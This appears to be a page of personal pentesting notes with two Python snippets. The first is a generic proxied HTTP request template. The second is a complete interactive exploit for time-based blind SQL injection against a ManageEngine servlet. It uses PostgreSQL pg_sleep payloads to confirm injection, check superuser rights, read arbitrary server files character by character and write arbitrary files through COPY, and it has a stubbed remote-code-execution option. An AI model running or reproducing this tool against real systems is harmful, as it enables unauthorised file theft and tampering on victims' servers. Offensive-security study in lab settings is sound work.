# Python Code Block

## HTTP Proxy + Simple Request

{% code overflow="wrap" %}
```python
import requests, sys

# -----Disable SSL warning-----
requests.packages.urllib3.disable_warnings()


# -----PROXY-----
session = requests.Session()
session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

session.verify = False

# -----GET Request Example-----
response = session.get("https://example.com")
print(response.text)


# -----POST Request Example-----
data = {
    "parameter": "value"
}

response = session.post("https://example.com/api", data=data)
print(response.status_code)
print(response.text)
```
{% endcode %}

## PostgreSQL

{% code overflow="wrap" %}
```python
import requests
import sys

# -----Config-----
PROXY = "http://127.0.0.1:8080"
BASE_URL = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1"
SLEEP_TIMER = 5
TIMEOUT = 25
THRESHOLD = 1.5  # Margin to account for network variance

# -----Session setup-----
session = requests.Session()
session.proxies = {"http": PROXY, "https": PROXY}
session.verify = False
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# -----Helpers-----
def send_payload(payload: str) -> float:
    """Send request with SQL payload and return response time in seconds."""
    try:
        full_url = BASE_URL + payload
        response = session.get(full_url, timeout=TIMEOUT)
        return response.elapsed.total_seconds()
    except requests.RequestException as e:
        print(f"[!] Request failed: {e}")
        return 0

def is_timed_response(elapsed: float, expected: int = SLEEP_TIMER) -> bool:
    return expected <= elapsed < expected + THRESHOLD

# -----Attack Steps-----
def test_sql_injection():
    print("[*] Testing sleep-based SQLi...")
    payload = f";SELECT+pg_sleep({SLEEP_TIMER});--"
    elapsed = send_payload(payload)
    print(f"[+] Response time: {elapsed:.2f} seconds")
    return is_timed_response(elapsed)

def check_superuser():
    print("[*] Testing for superuser access...")
    payload = f";SELECT+CASE+WHEN+(SELECT+current_setting($$is_superuser$$))=$$on$$+THEN+pg_sleep({SLEEP_TIMER})+END;--"
    elapsed = send_payload(payload)
    print(f"[+] Response time: {elapsed:.2f} seconds")
    return is_timed_response(elapsed)

def read_file(path: str):
    print(f"[*] Attempting to read file: {path}")
    length = detect_length(path) or 30
    print(f"[*] Attempting to extract first {length} characters of the file...")
    ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789./_-:$@{}()[]!#%&= "
    extracted = ""

    for position in range(1, length + 1):
        found = False
        for ch in ALPHABET:
            ascii_val = ord(ch)
            payload = (
                f";+DROP+TABLE+IF+EXISTS+pwned;+CREATE+TEMP+TABLE+pwned+(content+TEXT);+"
                f"COPY+pwned+FROM+$$" + path + "$$;+"
                f"SELECT+CASE+WHEN+(ascii(substr((SELECT+content+FROM+pwned),{position},1))={ascii_val})+THEN+pg_sleep({SLEEP_TIMER})+END;--"
            )

            elapsed = send_payload(payload)
            if is_timed_response(elapsed):
                extracted += ch
                print(f"[+] Char {position}: '{ch}' (elapsed: {elapsed:.2f}s)")
                found = True
                break
        if not found:
            print(f"[-] Char {position}: not found")
            extracted += "?"
    print(f"\n[+] Extracted content: {extracted}")

def write_file(path: str, content: str):
    print(f"[*] Attempting to write to: {path}")
    payload = f";COPY (SELECT $$" + content + "$$) TO $$" + path + "$$;--"
    elapsed = send_payload(payload)
    print("[-] Command sent. Please confirm output with Read File function.")

def detect_length(path, max_len=100):
    print(f"[*] Determining content length (max {max_len})...")
    for length in range(1, max_len + 1):
        payload = (
            f";+DROP+TABLE+IF+EXISTS+pwned;+CREATE+TEMP+TABLE+pwned+(content+TEXT);+"
            f"COPY+pwned+FROM+$$" + path + "$$;+"
            f"SELECT+CASE+WHEN+(LENGTH((SELECT+content+FROM+pwned))={length}) "
            f"THEN+pg_sleep({SLEEP_TIMER})+END;--"
        )
        elapsed = send_payload(payload)
        if is_timed_response(elapsed):
            print(f"[+] Detected length: {length}")
            return length
    print("[-] Failed to determine length.")
    return None

# -----Main Menu-----
def main():
    if not test_sql_injection():
        print("[-] Initial SQLi test failed.")
        return

    if check_superuser():
        print("[+] Superuser access confirmed!")
    else:
        print("[-] Not a superuser or check failed.")

    while True:
        print("\n=== Actions ===")
        print("[1] Read file")
        print("[2] Write to file")
        print("[3] Attempt RCE (TODO)")
        print("[4] Quit")
        choice = input("Select an option: ").strip()

        if choice == "1":
            path = input("Enter full file path to read: ").strip()
            if path:
                read_file(path)
        elif choice == "2":
            path = input("Enter full file path to write to: ").strip()
            content = input("Enter content to write: ").strip()
            if path and content:
                write_file(path, content)
        elif choice == "3":
            print("[!] RCE functionality not yet implemented.")
        elif choice == "4":
            print("Exiting.")
            sys.exit()
        else:
            print("Invalid option. Try again.")

if __name__ == "__main__":
    main()
```
{% endcode %}
